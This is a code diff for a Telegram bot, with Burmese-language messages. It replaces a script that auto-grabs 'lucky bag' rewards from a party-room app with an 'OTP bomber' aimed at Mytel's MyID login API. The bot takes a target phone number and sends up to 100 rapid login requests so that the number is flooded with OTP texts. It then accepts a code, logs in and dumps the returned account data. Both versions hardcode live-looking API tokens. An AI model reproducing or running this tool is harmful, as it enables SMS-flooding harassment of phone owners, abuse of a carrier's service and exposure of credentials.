@@ -1,97 +1,147 @@
-import os
-import asyncio
+import logging
 import requests
+import asyncio
 from aiogram import Bot, Dispatcher, types
 from aiogram.utils import executor
-from flask import Flask
-from threading import Thread
+from aiogram.dispatcher import FSMContext
+from aiogram.dispatcher.filters.state import State, StatesGroup
+from aiogram.contrib.fsm_storage.memory import MemoryStorage
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-# --- Configuration ---
+# --- Config ---
 API_TOKEN = '8702294693:AAGbo2lTWP-aV1jV8Be6nN5NSnz2WO_aZJk'
-LIT_TOKEN = "YWMtOs1AxE6JEfGMQK35LXPHlwC3x2A3exHpkKgjudNTjb0ZQwwAzFsR8JWtDRpn0gquAwMAAAGeH7jqmTht7EDd_nns6iTySRbBrvMZueFVp-UzTJHDDF30mKnSJN8Oug"
-ORG_APP = "1102190223222824/lit"
-BASE_URL = f"http://a1-sgp-ga.easemob.com/{ORG_APP}"
+logging.basicConfig(level=logging.INFO)
 
 bot = Bot(token=API_TOKEN)
-dp = Dispatcher(bot)
-app = Flask(__name__)
-is_collecting = False
+storage = MemoryStorage()
+dp = Dispatcher(bot, storage=storage)
 
-@app.route('/')
-def home(): return "Party Monitor Active!"
+# --- States ---
+class MytelBomber(StatesGroup):
+    waiting_phone = State()
+    waiting_count = State()
+    waiting_otp = State()
 
-def run_flask():
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host='0.0.0.0', port=port)
+# Header for Mytel API
+HEADERS = {
+    'User-Agent': 'MyID/3.2.1 (Android; 13)',
+    'Content-Type': 'application/json'
+}
 
-# --- Monitoring & Collecting Logic ---
-async def collect_process(chat_id):
-    global is_collecting
-    session_total = 0
-    await bot.send_message(chat_id, "🚀 Party Room တွေကို စတင်စောင့်ကြည့်နေပါပြီ ကိုကို!")
+# --- Keyboards ---
+def get_cancel_kb():
+    return InlineKeyboardMarkup().add(InlineKeyboardButton("🛑 CANCEL ACTION", callback_data="cancel"))
+
+# --- Handlers ---
+
+@dp.message_handler(commands=['start'])
+async def cmd_start(m: types.Message):
+    welcome_text = (
+        "🛡 **MYID OTP UTILITY - v2.0**\n"
+        "━━━━━━━━━━━━━━━━━━━━\n"
+        "စနစ်ကို အသုံးပြု၍ Mytel OTP များကို \n"
+        "အကြိမ်ရေအလိုက် ပို့လွှတ်နိုင်ပါသည်။\n\n"
+        "🔹 **Commands:**\n"
+        "➥ /login - စနစ်ကို စတင်ရန်\n"
+        "➥ /help  - အကူအညီ ရယူရန်\n\n"
+        "**Developed by Dominic**"
+    )
+    await m.answer(welcome_text, parse_mode="Markdown")
+
+@dp.message_handler(commands=['login'], state="*")
+async def start_login(m: types.Message):
+    await m.answer("📱 **အသုံးပြုမည့် ဖုန်းနံပါတ် ရိုက်ထည့်ပါ-**\n(ဥပမာ - 0969xxxxxxx)", reply_markup=get_cancel_kb())
+    await MytelBomber.waiting_phone.set()
+
+@dp.callback_query_handler(text="cancel", state="*")
+async def cancel_action(cb: types.CallbackQuery, state: FSMContext):
+    await state.finish()
+    await cb.message.edit_text("❌ **လုပ်ဆောင်ချက်ကို ရပ်ဆိုင်းလိုက်ပါပြီ။**")
+    await cb.answer()
+
+@dp.message_handler(state=MytelBomber.waiting_phone)
+async def process_phone(m: types.Message, state: FSMContext):
+    phone = m.text.strip()
+    if not phone.startswith("09") or len(phone) < 9:
+        return await m.reply("❌ **ဖုန်းနံပါတ် ပုံစံ မှားယွင်းနေပါသည်။**")
+
+    await state.update_data(phone=phone)
+    await m.answer(f"🔢 **TARGET:** `{phone}`\n\nပို့လွှတ်လိုသည့် OTP အကြိမ်ရေကို ရိုက်ထည့်ပါ:\n(အများဆုံး ၁၀၀ ကြိမ်အထိသာ)")
+    await MytelBomber.waiting_count.set()
+
+@dp.message_handler(state=MytelBomber.waiting_count)
+async def process_count(m: types.Message, state: FSMContext):
+    if not m.text.isdigit():
+        return await m.reply("❌ **ဂဏန်းများသာ ရိုက်ထည့်ပေးပါ။**")
     
-    while is_collecting:
+    count = int(m.text)
+    if count < 1 or count > 100:
+        return await m.reply("⚠️ **၁ မှ ၁၀၀ ကြိမ်အတွင်းသာ ရွေးချယ်ပါ။**")
+
+    user_data = await state.get_data()
+    phone = user_data.get("phone")
+    
+    status_msg = await m.answer(f"⚙️ **SYSTEM INITIALIZING...**\n━━━━━━━━━━━━━━\n📱 PHONE: `{phone}`\n📊 TOTAL: `{count}`", parse_mode="Markdown")
+    
+    success = 0
+    fail = 0
+    url = f"https://apis.mytel.com.mm/myid/authen/v1.0/v2/login/action/check-account?phoneNumber={phone}"
+
+    for i in range(1, count + 1):
         try:
-            # Hot Rooms စာရင်းယူမယ်
-            r = requests.get(f"{BASE_URL}/rooms?limit=10&sort=hot", headers={"Authorization": f"Bearer {LIT_TOKEN}"})
-            rooms = r.json().get('entities', [])
+            res = requests.get(url, headers=HEADERS, timeout=5)
+            if res.status_code == 200:
+                success += 1
+            else:
+                fail += 1
             
-            for room in rooms:
-                if not is_collecting: break
-                
-                room_id = room.get('id')
-                room_name = room.get('name', 'အမည်မရှိအခန်း')
-                user_count = room.get('user_count', 0)
-                
-                # အခန်းထဲဝင်တိုင်း Info ကို အရင်ပြမယ်
-                info_msg = (
-                    f"📺 **Party Monitoring**\n"
+            if i % 3 == 0 or i == count:
+                progress_bar = "▓" * (i // 10) + "░" * (10 - (i // 10))
+                await status_msg.edit_text(
+                    f"⚡ **OTP BOMBING IN PROGRESS...**\n"
                     f"━━━━━━━━━━━━━━\n"
-                    f"🏠 အခန်း: {room_name}\n"
-                    f"🆔 ID: `{room_id}`\n"
-                    f"👥 လူဦးရေ: {user_count} ယောက်"
+                    f"🎯 TARGET: `{phone}`\n"
+                    f"📈 PROGRESS: `{i}/{count}`\n"
+                    f"🔋 STATUS: [{progress_bar}]\n\n"
+                    f"✅ SUCCESS: `{success}`\n"
+                    f"❌ FAILED: `{fail}`",
+                    parse_mode="Markdown"
                 )
-                status_sent = await bot.send_message(chat_id, info_msg, parse_mode="Markdown")
-                
-                # စိန်အိတ် (Lucky Bag) ရှိမရှိ စစ်မယ်
-                bag_res = requests.get(f"{BASE_URL}/rooms/{room_id}/luckybags", headers={"Authorization": f"Bearer {LIT_TOKEN}"})
-                bags = bag_res.json().get('entities', [])
-                
-                for bag in bags:
-                    bag_id = bag.get('id')
-                    # စိန်လှမ်းကောက်မယ်
-                    grab_res = requests.post(f"{BASE_URL}/rooms/{room_id}/luckybags/{bag_id}/grab", headers={"Authorization": f"Bearer {LIT_TOKEN}"})
-                    
-                    if grab_res.status_code == 200:
-                        amt = grab_res.json().get('amount', 0)
-                        if amt > 0:
-                            session_total += amt
-                            await bot.send_message(chat_id, f"🎊 **စိန်ရပါပြီ ကိုကို!**\n➕ ရရှိစိန်: +{amt}\n💰 စုစုပေါင်း: {session_total}")
+            await asyncio.sleep(0.4) 
+        except:
+            fail += 1
 
-                # စာမျက်နှာ မရှုပ်အောင် ၅ စက္ကန့်နေရင် လက်ရှိ Room Info စာကို ပြန်ဖျက်ပေးမယ်
-                await asyncio.sleep(5)
-                try:
-                    await bot.delete_message(chat_id, status_sent.message_id)
-                except: pass
-                
-        except: pass
-        await asyncio.sleep(2)
+    await status_msg.edit_text(
+        f"🏁 **PROCESS COMPLETED**\n"
+        f"━━━━━━━━━━━━━━\n"
+        f"📱 TARGET: `{phone}`\n"
+        f"✅ SUCCESS: `{success}`\n"
+        f"❌ FAILED: `{fail}`\n\n"
+        "💡 OTP ရရှိပါက Login ဝင်ရန် ခြောက်လုံးဂဏန်း ရိုက်ထည့်ပါ။",
+        parse_mode="Markdown"
+    )
+    await MytelBomber.waiting_otp.set()
 
-@dp.message_handler(commands=['collect'])
-async def start_collect(message: types.Message):
-    global is_collecting
-    if not is_collecting:
-        is_collecting = True
-        asyncio.create_task(collect_process(message.chat.id))
-    else:
-        await message.answer("⚠️ Bot က အလုပ်လုပ်နေတုန်းပါ ကိုကို။")
+@dp.message_handler(state=MytelBomber.waiting_otp)
+async def process_otp(m: types.Message, state: FSMContext):
+    otp = m.text.strip()
+    data = await state.get_data()
+    phone = data.get("phone")
 
-@dp.message_handler(commands=['stop'])
-async def stop_collect(message: types.Message):
-    global is_collecting
-    is_collecting = False
-    await message.answer("🛑 စောင့်ကြည့်တာကို ရပ်လိုက်ပါပြီ။")
+    v_url = "https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/validate-otp"
+    payload = {"phoneNumber": phone, "otp": otp, "isWap": False}
+
+    try:
+        res = requests.post(v_url, json=payload, headers=HEADERS)
+        if res.status_code == 200:
+            await m.answer(f"💎 **ACCESS GRANTED**\n\nData Log:\n`{res.json()}`", parse_mode="Markdown")
+        else:
+            await m.answer("❌ **OTP မှားယွင်းနေပါသည်။**")
+    except Exception as e:
+        await m.answer(f"⚠️ **ERROR:** `{e}`")
+    
+    await state.finish()
 
 if __name__ == '__main__':
-    Thread(target=run_flask).start()
+    print("Dominic MyID System Online.")
     executor.start_polling(dp, skip_updates=True)
